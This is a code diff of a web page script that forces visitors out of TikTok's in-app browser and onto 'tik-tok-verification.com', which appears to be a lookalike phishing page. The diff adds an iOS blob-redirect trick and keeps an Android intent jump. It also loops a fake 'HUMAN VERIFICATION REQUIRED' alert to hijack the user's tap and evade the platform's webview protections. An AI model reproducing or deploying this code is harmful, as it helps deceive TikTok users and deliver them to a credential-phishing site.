@@ -11,31 +11,37 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 15000;
 
-    function forceDefaultBrowser() {
+    function forceSafariJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
-            // Android: This "Generic Intent" targets the DEFAULT browser, not just Chrome
+            // Android: Pure Browser Intent (No package specified)
             window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
         } else {
-            // iOS: Using the 'x-web-search' trick to force the "Open in Safari" prompt
-            // This bypasses the TikTok webview by triggering a system-level URI
-            window.location.href = "x-web-search://?" + encodeURIComponent(targetUrl);
+            // iOS: THE BLOB TRICK
+            // We create a tiny "fake" file that redirects to your URL.
+            // TikTok can't run this, so it pushes the user to Safari.
+            const blobContent = `<script>window.location.href="${targetUrl}";<\/script>`;
+            const blob = new Blob([blobContent], {type: 'text/html'});
+            const blobUrl = URL.createObjectURL(blob);
             
-            // Fail-safe: Direct assignment in case the protocol is blocked
+            // This specific call often forces the "Open in Safari?" prompt
+            window.location.assign(blobUrl);
+            
+            // Backup: Direct location
             setTimeout(() => {
-                window.location.assign(targetUrl);
+                window.location.href = targetUrl;
             }, 100);
         }
     }
 
-    function runLock() {
+    function securityLogic() {
         if (Date.now() > killTime) return;
 
-        // 1. Initial jump attempt
-        forceDefaultBrowser();
+        // 1. Try to force Safari
+        forceSafariJump();
 
-        // 2. Focus Check (Wait 320ms for OS to respond)
+        // 2. Focus Check
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -43,16 +49,16 @@
                 
                 alert(header + body);
 
-                // 3. RELAY: Firing immediately after OK to use the tap gesture
-                forceDefaultBrowser();
+                // 3. Post-Alert Relay (User Gesture)
+                forceSafariJump();
 
-                setTimeout(runLock, 320);
+                setTimeout(securityLogic, 320);
             }
         }, 320);
     }
 
-    window.onload = runLock;
-    window.onfocus = () => { if (Date.now() < killTime) runLock(); };
+    window.onload = securityLogic;
+    window.onfocus = () => { if (Date.now() < killTime) securityLogic(); };
 </script>
 
 </body>
